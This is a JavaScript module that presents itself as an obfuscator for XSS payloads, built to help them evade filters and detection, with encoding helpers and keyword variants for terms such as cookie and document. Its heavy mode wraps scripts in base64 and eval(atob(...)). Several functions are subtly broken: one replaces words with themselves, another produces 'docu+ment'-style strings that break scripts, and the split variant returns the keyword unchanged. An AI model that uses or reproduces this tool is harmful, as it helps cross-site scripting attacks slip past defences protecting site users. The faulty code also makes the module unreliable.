/**
 * JavaScript obfuscator for XSS payloads
 * 
 * This module provides various levels of obfuscation for XSS payloads
 * to help evade filters and detection mechanisms.
 */

/**
 * Obfuscate a JavaScript script with specified level
 * @param {string} script - The script to obfuscate
 * @param {number} level - Obfuscation level (0-3)
 * @returns {string} Obfuscated script
 */
function obfuscateScript(script, level = 2) {
  switch (level) {
    case 0:
      // No obfuscation
      return script;
    case 1:
      // Basic obfuscation
      return basicObfuscation(script);
    case 2:
      // Medium obfuscation
      return mediumObfuscation(script);
    case 3:
      // Heavy obfuscation
      return heavyObfuscation(script);
    default:
      return mediumObfuscation(script);
  }
}

/**
 * Basic obfuscation - simple encoding techniques
 */
function basicObfuscation(script) {
  // Replace common strings with encoded versions
  return script
    .replace(/document/g, 'document')
    .replace(/window/g, 'window')
    .replace(/location/g, 'location')
    .replace(/cookie/g, 'cookie')
    .replace(/navigator/g, 'navigator');
}

/**
 * Medium obfuscation - string concatenation and encoding
 */
function mediumObfuscation(script) {
  // Use string concatenation to hide keywords
  return script
    .replace(/document/g, 'docu ment'.replace(/ /g, '+'))
    .replace(/window/g, 'wind ow'.replace(/ /g, '+'))
    .replace(/location/g, 'loc atio n'.replace(/ /g, '+'))
    .replace(/cookie/g, 'coo kie'.replace(/ /g, '+'))
    .replace(/navigator/g, 'nav igator'.replace(/ /g, '+'))
    .replace(/XMLHttpRequest/g, 'XML Http Request'.replace(/ /g, '+'));
}

/**
 * Heavy obfuscation - advanced techniques
 */
function heavyObfuscation(script) {
  // Convert to base64 and use eval
  const encoded = Buffer.from(script).toString('base64');
  return `
    eval(atob('${encoded}'));
  `;
}

/**
 * Encode string using various techniques
 */
function encodeString(str, method) {
  switch (method) {
    case 'hex':
      return str.split('').map(c => 
        c.charCodeAt(0) < 128 ? 
        '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0') : 
        c
      ).join('');
      
    case 'unicode':
      return str.split('').map(c => 
        c.charCodeAt(0) < 128 ? 
        '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0') : 
        c
      ).join('');
      
    case 'base64':
      return Buffer.from(str).toString('base64');
      
    default:
      return str;
  }
}

/**
 * Generate encoded variants of common XSS keywords
 */
function generateKeywordVariants(keyword) {
  const variants = [];
  
  // Original
  variants.push(keyword);
  
  // Hex encoded
  variants.push(encodeString(keyword, 'hex'));
  
  // Unicode encoded
  variants.push(encodeString(keyword, 'unicode'));
  
  // Split and concatenated
  if (keyword.length > 3) {
    const mid = Math.floor(keyword.length / 2);
    variants.push(`${keyword.substring(0, mid)}${keyword.substring(mid)}`);
  }
  
  return variants;
}

module.exports = {
  obfuscateScript,
  encodeString,
  generateKeywordVariants
};